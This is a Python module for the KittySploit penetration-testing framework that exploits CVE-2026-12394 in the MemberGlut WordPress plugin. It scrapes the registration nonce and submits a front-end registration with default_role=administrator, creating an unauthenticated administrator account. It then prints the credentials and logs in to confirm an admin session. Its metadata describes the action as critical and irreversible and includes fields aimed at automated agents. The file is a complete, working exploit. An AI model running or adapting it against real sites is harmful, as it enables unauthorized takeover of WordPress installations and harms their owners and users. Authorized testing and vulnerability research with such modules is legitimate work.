#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MemberGlut CVE-2026-12394 — register unauthenticated administrator account."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "MemberGlut CVE-2026-12394 administrator registration",
        "description": (
            "CVE-2026-12394: MemberGlut < 1.1.5 does not validate default_role on front-end "
            "registration. POST action=memberglut_register with default_role=administrator "
            "creates an administrator account and outputs credentials; wp-login may set cookies on the module HTTP client only."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-12394"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-12394",
            "https://wpscan.com/vulnerability/6b126a3e-30d5-4bed-ba47-33e589ec2852/",
        ],
        "tags": [
            "auxiliary", "wordpress", "memberglut", "privesc", "unauth", "cve-2026-12394"],
        "agent": {
            "risk": "critical",
            "effects": ["active_exploitation", "account_creation"],
            "expected_requests": 3,
            "reversible": False,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "chain": {
                "suggested_followups": [
                    "scanner/http/memberglut_cve_2026_12394_detect",
                ],
            },
        },
    }

    path = OptString("/", "WordPress base path", required=False)
    register_path = OptString("/register/", "Registration page URL path", required=False)
    username = OptString("", "Username (empty = random ks*)", required=False)
    password = OptString("", "Password (empty = Cve12394Test1!)", required=False)

    _NONCE_RE = re.compile(r'name="register_nonce"\s*value="([a-f0-9]+)"', re.I)

    def _base(self) -> str:
        return self.wp_normalize_base_path(self.path or "/")

    def _join(self, suffix: str) -> str:
        root = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{root}{suffix}" if root != "/" else suffix

    def check(self):
        reg = self._join((self.register_path or "/register/").strip())
        response = self.http_request(method="GET", path=reg, allow_redirects=True)
        if not response or response.status_code != 200:
            return {"vulnerable": False, "reason": "Registration page unreachable", "confidence": "low"}
        body = response.text or ""
        if "memberglut_register" not in body or "register_nonce" not in body:
            return {"vulnerable": False, "reason": "MemberGlut register form not found", "confidence": "medium"}
        return {"vulnerable": True, "reason": "MemberGlut registration endpoint exposed", "confidence": "medium"}

    def run(self):
        chk = self.check()
        if not chk.get("vulnerable"):
            print_error(chk.get("reason"))
            return False
        reg = self._join((self.register_path or "/register/").strip())
        page = self.http_request(method="GET", path=reg, allow_redirects=True)
        match = self._NONCE_RE.search(page.text or "")
        if not match:
            print_error("register_nonce not found")
            return False
        user = (self.username or "").strip() or f"ks{secrets.token_hex(4)}"
        pwd = (self.password or "").strip() or "Cve12394Test1!"
        email = f"{user}@example.test"
        post = self.http_request(
            method="POST",
            path=reg,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "action": "memberglut_register",
                "register_nonce": match.group(1),
                "username": user,
                "email": email,
                "password": pwd,
                "first_name": "Kitty",
                "last_name": "Sploit",
                "default_role": "administrator",
            },
            allow_redirects=False,
        )
        if not post:
            print_error("Registration POST failed")
            return False
        print_success(f"Registration submitted for {user}")
        print_status(f"Username: {user}")
        print_status(f"Password: {pwd}")
        login = self.http_request(
            method="POST",
            path=self._join("/wp-login.php"),
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": "wordpress_test_cookie=WP Cookie check",
            },
            data={
                "log": user,
                "pwd": pwd,
                "wp-submit": "Log In",
                "redirect_to": self._join("/wp-admin/"),
                "testcookie": "1",
            },
            allow_redirects=False,
        )
        if login and login.status_code == 302 and "wordpress_logged_in" in str(login.headers):
            print_success("Administrator session established")
            return True
        print_warning("Registration sent; verify admin access manually")
        return True
